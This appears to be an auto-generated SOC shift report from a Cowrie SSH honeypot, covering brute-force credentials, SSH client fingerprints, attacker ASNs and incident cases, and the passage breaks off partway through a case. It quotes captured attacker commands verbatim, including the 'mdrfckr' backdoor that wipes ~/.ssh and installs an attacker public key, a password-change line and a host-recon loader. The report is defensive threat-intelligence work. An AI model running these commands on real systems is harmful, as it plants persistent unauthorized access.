# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-04 |
| **Generated At** | 2026-07-04T10:16:01Z |
| **Shift Time** | 10:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **562** |
| Confirmed Threats | **376** |
| False Positives Filtered | **186** (33.1%) |
| Unique Attacker IPs | **74** |
| Countries of Origin | **19** |
| High Severity Cases | **163** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **399** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **213** |
| Unique Credential Pairs | **123** |
| Unique Usernames | **33** |
| Unique Passwords | **98** |
| Successful Auth Pairs | **172** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `admin` | 38 |
| `345gs5662d34` | 29 |
| `support` | 10 |
| `ubuntu` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 29 |
| `3245gs5662d34` | 29 |
| `support` | 10 |
| `admin` | 7 |
| `LeitboGi0ro` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `3245gs5662d34` | 15 |
| `support` | `support` | 10 |
| `root` | `LeitboGi0ro` | 7 |
| `root` | `smo@@kkklss` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Pass@word12` | `45.198.224.120` | 2026-07-04T04:57:40 |
| `admin` | `123` | `92.118.39.50` | 2026-07-04T04:58:40 |
| `admin` | `1q2w3e4r` | `91.92.40.7` | 2026-07-04T04:58:40 |
| `admin` | `123123` | `92.118.39.50` | 2026-07-04T05:03:15 |
| `support` | `support` | `176.53.159.196` | 2026-07-04T05:03:32 |
| `admin` | `P@ssw0rd123` | `91.92.40.7` | 2026-07-04T05:04:32 |
| `support` | `support` | `10.0.0.73` | 2026-07-04T05:04:54 |
| `root` | `git123` | `185.242.3.195` | 2026-07-04T05:06:30 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.25.99` | 2026-07-04T05:07:39 |
| `admin` | `123321` | `92.118.39.50` | 2026-07-04T05:07:47 |
| `*1` | `$4` | `34.78.25.99` | 2026-07-04T05:07:48 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7928` | `34.78.25.99` | 2026-07-04T05:07:50 |
| `user` | `password` | `45.198.224.120` | 2026-07-04T05:09:47 |
| `admin` | `abc123` | `91.92.40.7` | 2026-07-04T05:10:07 |
| `admin` | `1234` | `92.118.39.50` | 2026-07-04T05:12:00 |
| `test` | `test@2024` | `186.103.169.12` | 2026-07-04T05:13:02 |
| `345gs5662d34` | `345gs5662d34` | `186.103.169.12` | 2026-07-04T05:13:05 |
| `test` | `3245gs5662d34` | `186.103.169.12` | 2026-07-04T05:13:06 |
| `dev` | `dev2024` | `103.187.147.214` | 2026-07-04T05:13:22 |
| `345gs5662d34` | `345gs5662d34` | `103.187.147.214` | 2026-07-04T05:13:26 |
| `dev` | `3245gs5662d34` | `103.187.147.214` | 2026-07-04T05:13:28 |
| `root` | `qweasd.123` | `163.7.8.79` | 2026-07-04T05:13:29 |
| `345gs5662d34` | `345gs5662d34` | `163.7.8.79` | 2026-07-04T05:13:33 |
| `root` | `3245gs5662d34` | `163.7.8.79` | 2026-07-04T05:13:35 |
| `admin` | `admin123` | `91.92.40.7` | 2026-07-04T05:15:28 |
| `admin` | `12345` | `92.118.39.50` | 2026-07-04T05:16:03 |
| `admin` | `123456` | `92.118.39.50` | 2026-07-04T05:20:11 |
| `root` | `P@ss123!@#` | `45.198.224.120` | 2026-07-04T05:21:37 |
| `admin` | `letmein` | `91.92.40.7` | 2026-07-04T05:21:52 |
| `admin` | `1234567` | `92.118.39.50` | 2026-07-04T05:24:17 |
| `root` | `david123` | `39.170.108.144` | 2026-07-04T05:27:46 |
| `admin` | `pass123` | `91.92.40.7` | 2026-07-04T05:27:46 |
| `345gs5662d34` | `345gs5662d34` | `39.170.108.144` | 2026-07-04T05:27:53 |
| `root` | `3245gs5662d34` | `39.170.108.144` | 2026-07-04T05:27:57 |
| `admin` | `12345678` | `92.118.39.50` | 2026-07-04T05:28:12 |
| `root` | `Abcd123456!@#$%^` | `121.184.144.232` | 2026-07-04T05:29:10 |
| `345gs5662d34` | `345gs5662d34` | `121.184.144.232` | 2026-07-04T05:29:14 |
| `root` | `3245gs5662d34` | `121.184.144.232` | 2026-07-04T05:29:15 |
| `argos` | `argos` | `118.193.61.170` | 2026-07-04T05:29:27 |
| `345gs5662d34` | `345gs5662d34` | `118.193.61.170` | 2026-07-04T05:29:30 |
| `argos` | `3245gs5662d34` | `118.193.61.170` | 2026-07-04T05:29:32 |
| `root` | `admin` | `154.90.70.254` | 2026-07-04T05:32:09 |
| `admin` | `123456789` | `92.118.39.50` | 2026-07-04T05:32:17 |
| `deploy` | `pass123` | `103.237.144.204` | 2026-07-04T05:32:53 |
| `345gs5662d34` | `345gs5662d34` | `103.237.144.204` | 2026-07-04T05:33:00 |
| `deploy` | `3245gs5662d34` | `103.237.144.204` | 2026-07-04T05:33:02 |
| `test` | `test12345` | `45.198.224.120` | 2026-07-04T05:33:34 |
| `admin` | `password` | `91.92.40.7` | 2026-07-04T05:34:58 |
| `admin` | `1234567890` | `92.118.39.50` | 2026-07-04T05:36:09 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-04T05:36:58 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-04T05:36:58 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-04T05:37:04 |
| `office1` | `office1` | `58.56.200.238` | 2026-07-04T05:37:42 |
| `admin` | `123456a` | `92.118.39.50` | 2026-07-04T05:39:41 |
| `admin` | `password1` | `91.92.40.7` | 2026-07-04T05:41:24 |
| `admin` | `123qwe` | `92.118.39.50` | 2026-07-04T05:43:21 |
| `ubuntu` | `root123456789` | `45.198.224.120` | 2026-07-04T05:45:25 |
| `admin` | `1q2w3e4r` | `92.118.39.50` | 2026-07-04T05:46:55 |
| `root` | `git123` | `10.0.0.73` | 2026-07-04T05:46:56 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.205.43.106` | 2026-07-04T05:48:04 |
| `admin` | `qwerty123` | `91.92.40.7` | 2026-07-04T05:48:06 |
| `*1` | `$4` | `35.205.43.106` | 2026-07-04T05:48:17 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6142` | `35.205.43.106` | 2026-07-04T05:48:19 |
| `admin` | `654321` | `92.118.39.50` | 2026-07-04T05:50:33 |
| `admin` | `7777777` | `92.118.39.50` | 2026-07-04T05:54:02 |
| `admin` | `root123` | `91.92.40.7` | 2026-07-04T05:54:43 |
| `ubuntu` | `p4$$w0rd` | `45.198.224.120` | 2026-07-04T05:57:22 |
| `admin` | `abc123` | `92.118.39.50` | 2026-07-04T05:57:29 |
| `admin` | `admin` | `92.118.39.50` | 2026-07-04T06:01:10 |
| `admin1` | `123` | `91.92.40.7` | 2026-07-04T06:01:36 |
| `admin` | `admin123` | `92.118.39.50` | 2026-07-04T06:04:45 |
| `admin` | `admin` | `130.211.52.176` | 2026-07-04T06:04:54 |
| `imac` | `imac` | `181.191.194.175` | 2026-07-04T06:06:36 |
| `345gs5662d34` | `345gs5662d34` | `181.191.194.175` | 2026-07-04T06:06:38 |
| `imac` | `3245gs5662d34` | `181.191.194.175` | 2026-07-04T06:06:39 |
| `admin` | `passw0rd` | `92.118.39.50` | 2026-07-04T06:08:29 |
| `admin1` | `1234` | `91.92.40.7` | 2026-07-04T06:08:51 |
| `root` | `q1w2e3` | `45.198.224.120` | 2026-07-04T06:08:56 |
| `root` | `12345` | `172.210.53.192` | 2026-07-04T06:11:17 |
| `admin` | `password` | `92.118.39.50` | 2026-07-04T06:12:04 |
| `admin1` | `admin123` | `91.92.40.7` | 2026-07-04T06:15:51 |
| `admin` | `password1` | `92.118.39.50` | 2026-07-04T06:15:58 |
| `root` | `ADMIN123` | `10.0.0.73` | 2026-07-04T06:16:05 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-04T06:16:08 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-04T06:16:10 |
| `root` | `Ye123456!` | `10.0.0.73` | 2026-07-04T06:16:19 |
| `root` | `1234@qaz` | `10.0.0.73` | 2026-07-04T06:19:51 |
| `admin` | `qwerty` | `92.118.39.50` | 2026-07-04T06:19:54 |
| `server1` | `server1` | `45.198.224.120` | 2026-07-04T06:20:39 |
| `root` | `cloud2024` | `10.0.0.73` | 2026-07-04T06:20:46 |
| `root` | `Winter2025` | `45.225.135.30` | 2026-07-04T06:22:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `172.235.41.203` | 2026-07-04T06:22:48 |
| `root` | `qwert0` | `45.198.224.120` | 2026-07-04T06:32:21 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.22.194.117` | 2026-07-04T06:38:18 |
| `b'\xae\x03p\xf1\xc59\xd3\xcc\x97\xf9\x02\xe66\xf9\x15\x8c\xf7?\x04gXF\x01d\xa0\x08\x1b6\xd1\x18~\xa7DQ\xf9S\xddv\xa0\xb4\xab\xb2\xd7G'` | `$ ` | `34.22.194.117` | 2026-07-04T06:38:18 |
| `root` | `zaq!xsw@` | `185.242.3.195` | 2026-07-04T06:38:26 |
| `*1` | `$4` | `34.22.194.117` | 2026-07-04T06:38:31 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2437` | `34.22.194.117` | 2026-07-04T06:38:33 |
| `root` | `Passwd!@#123` | `45.198.224.120` | 2026-07-04T06:44:18 |
| `root` | `qwe!@#QWE` | `45.198.224.120` | 2026-07-04T06:56:19 |
| `root` | `firewall` | `37.77.150.241` | 2026-07-04T06:59:55 |
| `345gs5662d34` | `345gs5662d34` | `37.77.150.241` | 2026-07-04T06:59:57 |
| `root` | `3245gs5662d34` | `37.77.150.241` | 2026-07-04T06:59:58 |
| `elms` | `elms` | `118.163.132.211` | 2026-07-04T07:02:05 |
| `345gs5662d34` | `345gs5662d34` | `118.163.132.211` | 2026-07-04T07:02:09 |
| `elms` | `3245gs5662d34` | `118.163.132.211` | 2026-07-04T07:02:11 |
| `root` | `Root!!2025` | `182.93.50.90` | 2026-07-04T07:02:55 |
| `345gs5662d34` | `345gs5662d34` | `182.93.50.90` | 2026-07-04T07:02:59 |
| `root` | `3245gs5662d34` | `182.93.50.90` | 2026-07-04T07:03:01 |
| `ubuntu` | `pwlamea123` | `112.137.143.2` | 2026-07-04T07:07:07 |
| `345gs5662d34` | `345gs5662d34` | `112.137.143.2` | 2026-07-04T07:07:11 |
| `ubuntu` | `3245gs5662d34` | `112.137.143.2` | 2026-07-04T07:07:12 |
| `usertest` | `usertest` | `45.198.224.120` | 2026-07-04T07:08:10 |
| `eforms` | `eforms` | `222.110.147.58` | 2026-07-04T07:11:25 |
| `345gs5662d34` | `345gs5662d34` | `222.110.147.58` | 2026-07-04T07:11:29 |
| `eforms` | `3245gs5662d34` | `222.110.147.58` | 2026-07-04T07:11:30 |
| `root` | `zaq!xsw@` | `10.0.0.73` | 2026-07-04T07:19:01 |
| `root` | `#EDCvfr4` | `10.0.0.73` | 2026-07-04T07:19:03 |
| `upload` | `upload` | `45.198.224.120` | 2026-07-04T07:20:23 |
| `admin5` | `123456` | `10.0.0.73` | 2026-07-04T07:26:22 |
| `admin5` | `3245gs5662d34` | `10.0.0.73` | 2026-07-04T07:26:28 |
| `ubuntu` | `qazwsx!@#` | `45.198.224.120` | 2026-07-04T07:32:21 |
| `ethics` | `ethics123` | `10.0.0.73` | 2026-07-04T07:36:00 |
| `ethics` | `3245gs5662d34` | `10.0.0.73` | 2026-07-04T07:36:06 |
| `billing` | `billing` | `45.198.224.120` | 2026-07-04T07:43:57 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-04T07:45:15 |
| `ftpuser` | `123123` | `37.110.113.113` | 2026-07-04T07:51:37 |
| `345gs5662d34` | `345gs5662d34` | `37.110.113.113` | 2026-07-04T07:51:40 |
| `ftpuser` | `3245gs5662d34` | `37.110.113.113` | 2026-07-04T07:51:41 |
| `root` | `123456ASD` | `45.4.179.4` | 2026-07-04T07:52:18 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-04T07:52:19 |
| `345gs5662d34` | `345gs5662d34` | `45.4.179.4` | 2026-07-04T07:52:20 |
| `root` | `3245gs5662d34` | `45.4.179.4` | 2026-07-04T07:52:21 |
| `test` | `password123` | `14.103.117.97` | 2026-07-04T07:53:29 |
| `police` | `police` | `45.198.224.120` | 2026-07-04T07:55:39 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-04T07:57:10 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-04T07:57:11 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-04T08:02:25 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-04T08:02:25 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-04T08:02:35 |
| `centos` | `123456` | `45.198.224.120` | 2026-07-04T08:07:21 |
| `ubuntu` | `demo` | `185.242.3.195` | 2026-07-04T08:10:41 |
| `root` | `domain123` | `114.10.47.235` | 2026-07-04T08:16:51 |
| `345gs5662d34` | `345gs5662d34` | `114.10.47.235` | 2026-07-04T08:16:56 |
| `root` | `3245gs5662d34` | `114.10.47.235` | 2026-07-04T08:16:58 |
| `root` | `mao123` | `20.229.115.183` | 2026-07-04T08:17:39 |
| `345gs5662d34` | `345gs5662d34` | `20.229.115.183` | 2026-07-04T08:17:42 |
| `root` | `3245gs5662d34` | `20.229.115.183` | 2026-07-04T08:17:43 |
| `root` | `Qwert12345` | `45.198.224.120` | 2026-07-04T08:19:02 |
| `root` | `﻿------fuck------` | `120.202.189.21` | 2026-07-04T08:24:13 |
| `root` | `nugKSsFBSp` | `121.89.94.217` | 2026-07-04T08:24:42 |
| `btp` | `btp` | `10.0.0.73` | 2026-07-04T08:28:15 |
| `btp` | `3245gs5662d34` | `10.0.0.73` | 2026-07-04T08:28:18 |
| `root` | `Qwe1!2` | `45.198.224.120` | 2026-07-04T08:30:42 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-04T08:38:02 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-04T08:38:02 |
| `eva` | `eva123` | `124.6.178.98` | 2026-07-04T08:40:29 |
| `345gs5662d34` | `345gs5662d34` | `124.6.178.98` | 2026-07-04T08:40:33 |
| `eva` | `3245gs5662d34` | `124.6.178.98` | 2026-07-04T08:40:35 |
| `root` | `Pass!@#$%` | `45.198.224.120` | 2026-07-04T08:42:22 |
| `root` | `Password05*` | `10.0.0.73` | 2026-07-04T08:42:57 |
| `root` | `Zxcvbnm0` | `10.0.0.73` | 2026-07-04T08:44:47 |
| `root` | `adminpass` | `10.0.0.73` | 2026-07-04T08:45:09 |
| `username` | `qwerty` | `10.0.0.73` | 2026-07-04T08:46:07 |
| `username` | `3245gs5662d34` | `10.0.0.73` | 2026-07-04T08:46:11 |
| `root` | `qweasdzxc2002` | `10.0.0.73` | 2026-07-04T08:46:38 |
| `mariusz` | `mariusz` | `10.0.0.73` | 2026-07-04T08:47:58 |
| `admin` | `admin@1234` | `10.0.0.73` | 2026-07-04T08:49:46 |
| `root` | `pippo` | `10.0.0.73` | 2026-07-04T08:50:43 |
| `ubuntu` | `demo` | `10.0.0.73` | 2026-07-04T08:51:00 |
| `sshd` | `` | `10.0.0.73` | 2026-07-04T08:51:04 |
| `root` | `r00t` | `45.198.224.120` | 2026-07-04T08:54:04 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **562** |
| Sessions with Fingerprint | **23** |
| Unique HASSH Fingerprints | **23** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 82 |
| Go SSH scanner | 79 |
| Paramiko (Python) | 22 |
| Nmap scanner | 7 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 52 | 20 |
| `2ec37a7cc8da...` | Mirai/variant | 35 | 2 |
| `16443846184e...` | Generic scanner | 30 | 4 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |
| `6372ee695756...` | Modern SSH client | 8 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 52 | 20 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 35 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 30 | 4 | Generic scanner |
| `95420f9d932d...` | libssh | 22 | 11 | — |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 8 | 2 | Modern SSH client |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **11** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 35 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 18 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "office1\nV0Vt17L8VkFa\nV0Vt17L8VkFa"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `58.56.200.238`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.7`, `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `37.77.150.241`, `103.237.144.204`, `37.110.113.113`, `45.4.179.4`, `182.93.50.90`, `103.187.147.214`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **74** |
| Unique ASNs | **48** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 7 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (162)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0678ed156b17

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 04:57 |
| **Last Seen** | 2026-07-04 04:57 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:57:32` | `cowrie.session.connect` |
| `2026-07-04 04:57:34` | `cowrie.client.version` |
| `2026-07-04 04:57:34` | `cowrie.client.kex` |
| `2026-07-04 04:57:40` | `cowrie.login.success` |
| `2026-07-04 04:57:45` | `cowrie.session.params` |
| `2026-07-04 04:57:45` | `cowrie.command.input` |
| `2026-07-04 04:57:47` | `cowrie.log.closed` |
| `2026-07-04 04:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd0c49d8fe1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:58 |
| **Last Seen** | 2026-07-04 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:58:39` | `cowrie.session.connect` |
| `2026-07-04 04:58:39` | `cowrie.client.version` |
| `2026-07-04 04:58:39` | `cowrie.client.kex` |
| `2026-07-04 04:58:40` | `cowrie.login.success` |
| `2026-07-04 04:58:40` | `cowrie.session.params` |
| `2026-07-04 04:58:40` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.success` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.log.closed` |
| `2026-07-04 04:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe6b498b6bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:58 |
| **Last Seen** | 2026-07-04 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:58:39` | `cowrie.session.connect` |
| `2026-07-04 04:58:39` | `cowrie.client.version` |
| `2026-07-04 04:58:40` | `cowrie.client.kex` |
| `2026-07-04 04:58:40` | `cowrie.login.success` |
| `2026-07-04 04:58:41` | `cowrie.session.params` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.success` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.command.input` |
| `2026-07-04 04:58:41` | `cowrie.log.closed` |
| `2026-07-04 04:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7fa8b4afac4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:03 |
| **Last Seen** | 2026-07-04 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:03:15` | `cowrie.session.connect` |
| `2026-07-04 05:03:15` | `cowrie.client.version` |
